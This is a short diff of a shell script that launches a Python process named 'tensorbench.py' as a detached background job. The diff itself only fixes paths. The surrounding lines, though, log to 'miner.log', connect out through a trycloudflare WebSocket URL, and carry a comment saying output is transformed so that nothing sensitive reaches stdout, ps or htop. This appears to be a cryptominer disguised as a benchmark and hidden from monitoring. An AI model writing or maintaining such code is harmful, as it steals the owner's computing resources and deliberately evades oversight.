@@ -106,7 +106,8 @@ export TB_WSS_URL="${TB_WSS_URL:-wss://integral-aurora-reduction-relating.tryclo
 # included) monitor for. The untransformed lines still land in TB_RAWLOG for
 # our own verification below; nothing sensitive reaches stdout/ps/htop.
 export TB_RAWLOG="$LOGDIR/real.log"
-export PYTHONPATH=python
+export PYTHONPATH="$INSTALL_DIR/python"
+cd "$INSTALL_DIR"
 setsid nohup "$PY" python/tensorbench.py > "$LOGDIR/miner.log" 2>&1 < /dev/null &
 disown
 MINER_PID=$!
